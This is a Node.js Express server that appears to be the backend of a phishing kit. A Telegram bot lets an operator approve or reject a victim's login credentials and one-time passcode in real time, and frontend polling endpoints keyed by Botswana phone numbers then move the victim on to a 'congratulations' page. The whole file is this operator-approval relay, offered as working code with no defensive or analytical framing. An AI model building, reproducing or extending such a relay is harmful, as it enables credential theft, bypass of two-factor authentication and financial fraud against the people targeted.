const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// =====================================================
// TELEGRAM BOT CONFIGURATION
// =====================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:8080';

// =====================================================
// MIDDLEWARE
// =====================================================
app.use(cors());
app.use(express.json());

// =====================================================
// IN-MEMORY STORAGE FOR APPROVALS
// =====================================================
// Structure: { [phoneNumber]: { login: true/false, otp: true/false, timestamp } }
const approvalStore = {};

// Auto-clear approvals after 10 minutes
setInterval(() => {
    const now = Date.now();
    const TEN_MINUTES = 10 * 60 * 1000;
    
    Object.keys(approvalStore).forEach(key => {
        if (now - approvalStore[key].timestamp > TEN_MINUTES) {
            delete approvalStore[key];
            console.log(`🧹 Cleared approval for: ${key}`);
        }
    });
}, 60000); // Check every minute

// =====================================================
// TELEGRAM WEBHOOK HANDLER
// =====================================================
app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('📨 Telegram Update:', JSON.stringify(update, null, 2));

        // Handle callback query (button clicks)
        if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const callbackData = callbackQuery.data;
            const messageId = callbackQuery.message.message_id;
            const userId = callbackQuery.from.id;

            console.log(`🔘 Callback Data: ${callbackData}`);

            let approvalType = null;
            let phoneNumber = null;

            // Parse callback data to determine action
            if (callbackData === 'login_approved') {
                approvalType = 'login';
                // Get phone from message text or stored data
                phoneNumber = extractPhoneFromMessage(callbackQuery.message.text);
                console.log(`✅ Login Approved for: ${phoneNumber}`);
                
                // Store approval
                if (!approvalStore[phoneNumber]) {
                    approvalStore[phoneNumber] = {};
                }
                approvalStore[phoneNumber].login = true;
                approvalStore[phoneNumber].timestamp = Date.now();

                // Edit message to show approval
                await editTelegramMessage(
                    messageId,
                    `✅ <b>LOGIN VERIFIED</b>\n\n✓ Credentials approved\nUser can proceed to OTP verification`
                );
            } 
            else if (callbackData === 'login_verify_device') {
                phoneNumber = extractPhoneFromMessage(callbackQuery.message.text);
                console.log(`⚠️ Device Verification Required for: ${phoneNumber}`);
                
                await editTelegramMessage(
                    messageId,
                    `⚠️ <b>DEVICE VERIFICATION REQUIRED</b>\n\n⚠ User needs to verify device\nPlease try again`
                );
            }
            else if (callbackData === 'login_deny') {
                phoneNumber = extractPhoneFromMessage(callbackQuery.message.text);
                console.log(`❌ Login Denied for: ${phoneNumber}`);
                
                if (!approvalStore[phoneNumber]) {
                    approvalStore[phoneNumber] = {};
                }
                approvalStore[phoneNumber].login = false;
                approvalStore[phoneNumber].loginDenied = true;
                approvalStore[phoneNumber].timestamp = Date.now();

                await editTelegramMessage(
                    messageId,
                    `❌ <b>LOGIN DENIED</b>\n\n✗ Login credentials rejected\nUser must try again`
                );
            }
            else if (callbackData === 'otp_approve') {
                phoneNumber = extractPhoneFromMessage(callbackQuery.message.text);
                console.log(`✅ OTP Approved for: ${phoneNumber}`);
                
                if (!approvalStore[phoneNumber]) {
                    approvalStore[phoneNumber] = {};
                }
                approvalStore[phoneNumber].otp = true;
                approvalStore[phoneNumber].timestamp = Date.now();

                await editTelegramMessage(
                    messageId,
                    `✅ <b>OTP VERIFIED</b>\n\n✓ OTP approved\nUser can proceed to congratulations`
                );
            }
            else if (callbackData === 'otp_wrong') {
                phoneNumber = extractPhoneFromMessage(callbackQuery.message.text);
                console.log(`❌ Wrong OTP for: ${phoneNumber}`);
                
                if (!approvalStore[phoneNumber]) {
                    approvalStore[phoneNumber] = {};
                }
                approvalStore[phoneNumber].otp = false;
                approvalStore[phoneNumber].otpWrong = true;
                approvalStore[phoneNumber].timestamp = Date.now();

                await editTelegramMessage(
                    messageId,
                    `❌ <b>WRONG OTP</b>\n\n✗ OTP is incorrect\nUser must re-enter OTP`
                );
            }
            else if (callbackData === 'app_approved_details') {
                console.log(`✅ Application Details Approved`);
                await editTelegramMessage(
                    messageId,
                    `✅ <b>APPLICATION APPROVED</b>\n\n✓ Details verified\nUser can proceed to login`
                );
            }
            else if (callbackData === 'app_deny_details') {
                console.log(`❌ Application Details Denied`);
                await editTelegramMessage(
                    messageId,
                    `❌ <b>APPLICATION DENIED</b>\n\n✗ Details rejected\nUser must restart application`
                );
            }

            // Answer callback query to remove loading state
            await answerCallbackQuery(callbackQuery.id);
        }

        res.json({ ok: true });
    } catch (error) {
        console.error('❌ Webhook Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// =====================================================
// API ENDPOINTS FOR FRONTEND
// =====================================================

// Check login approval status
app.post('/api/check-login-approval', (req, res) => {
    try {
        const { phoneNumber } = req.body;

        if (!phoneNumber) {
            return res.status(400).json({ error: 'Phone number required' });
        }

        const approval = approvalStore[phoneNumber];

        if (!approval) {
            return res.json({ 
                approved: false, 
                denied: false,
                message: 'Waiting for bot approval...'
            });
        }

        if (approval.loginDenied) {
            return res.json({ 
                approved: false, 
                denied: true,
                message: 'Login was denied by admin'
            });
        }

        if (approval.login === true) {
            return res.json({ 
                approved: true, 
                denied: false,
                message: 'Login approved'
            });
        }

        res.json({ 
            approved: false, 
            denied: false,
            message: 'Waiting for bot approval...'
        });
    } catch (error) {
        console.error('❌ API Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Check OTP approval status
app.post('/api/check-otp-approval', (req, res) => {
    try {
        const { phoneNumber } = req.body;

        if (!phoneNumber) {
            return res.status(400).json({ error: 'Phone number required' });
        }

        const approval = approvalStore[phoneNumber];

        if (!approval) {
            return res.json({ 
                approved: false, 
                wrong: false,
                message: 'Waiting for bot approval...'
            });
        }

        if (approval.otpWrong) {
            return res.json({ 
                approved: false, 
                wrong: true,
                message: 'OTP is incorrect'
            });
        }

        if (approval.otp === true) {
            return res.json({ 
                approved: true, 
                wrong: false,
                message: 'OTP approved'
            });
        }

        res.json({ 
            approved: false, 
            wrong: false,
            message: 'Waiting for bot approval...'
        });
    } catch (error) {
        console.error('❌ API Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Clear approval (for manual reset)
app.post('/api/clear-approval', (req, res) => {
    try {
        const { phoneNumber } = req.body;

        if (!phoneNumber) {
            return res.status(400).json({ error: 'Phone number required' });
        }

        delete approvalStore[phoneNumber];
        console.log(`🧹 Cleared approval for: ${phoneNumber}`);

        res.json({ 
            success: true,
            message: 'Approval cleared'
        });
    } catch (error) {
        console.error('❌ API Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK',
        timestamp: new Date().toISOString(),
        botConfigured: !!TELEGRAM_BOT_TOKEN
    });
});

// =====================================================
// HELPER FUNCTIONS
// =====================================================

function extractPhoneFromMessage(messageText) {
    // Extract phone number from Telegram message
    const phoneMatch = messageText.match(/\+267\d{8}|\d{8}/);
    return phoneMatch ? phoneMatch[0] : 'unknown';
}

async function editTelegramMessage(messageId, text) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML'
            }
        );
        console.log('✏️ Message edited in Telegram');
    } catch (error) {
        console.error('❌ Failed to edit message:', error.message);
    }
}

async function answerCallbackQuery(callbackQueryId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            {
                callback_query_id: callbackQueryId,
                text: '✓ Processed',
                show_alert: false
            }
        );
    } catch (error) {
        console.error('❌ Failed to answer callback query:', error.message);
    }
}

// =====================================================
// START SERVER
// =====================================================
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN ? '✓ Configured' : '✗ Not configured'}`);
    console.log(`💬 Frontend URL: ${FRONTEND_URL}`);
    console.log(`\n🔗 Webhook URL: https://your-backend-url.com/webhook/telegram`);
    console.log(`\n📚 API Endpoints:`);
    console.log(`  POST /api/check-login-approval`);
    console.log(`  POST /api/check-otp-approval`);
    console.log(`  POST /api/clear-approval`);
    console.log(`  GET  /api/health\n`);
});
